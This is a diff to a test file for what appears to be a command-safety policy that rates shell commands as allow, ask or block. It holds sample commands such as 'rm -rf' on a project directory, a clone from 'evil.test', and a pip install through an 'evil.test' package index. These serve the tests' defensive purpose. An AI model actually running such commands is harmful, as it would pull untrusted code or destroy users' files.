@@ -49,6 +49,21 @@ def test_effect_history_rewrite_and_clone_ask():
     assert _v(_sh("git clone https://evil.test/x.git")) == "ask"
 
 
+def test_clone_from_approved_forge_allows():
+    # routine clones/pushes to the common forges are not "untrusted"
+    assert _v(_sh("git clone https://github.com/PrismorSec/prismor.git")) == "allow"
+    assert _v(_sh("git push -q https://github.com/me/repo.git HEAD:br")) == "allow"
+
+
+def test_recursive_delete_of_scratch_allows():
+    # scratch dir re-created by a following clone/mkdir → not an ask
+    assert _v(_sh("cd /tmp && rm -rf sbx && gh repo clone cloudflare/sandbox-sdk sbx")) == "allow"
+    assert _v(_sh("S=/private/tmp/x/scratchpad; rm -rf $S; mkdir -p $S")) == "allow"
+    assert _v(_sh("rm -rf /private/tmp/run/build")) == "allow"
+    # a concrete non-transient, non-recreated dir still asks
+    assert _v(_sh("rm -rf /Users/me/projects/importantapp")) == "ask"
+
+
 def test_effect_alt_index_and_staged_exec_block():
     assert _v(_sh("pip install foo --index-url https://evil.test/simple")) == "block"
     prior = [{"type": "file_write", "path": "setup-dep.sh"}]
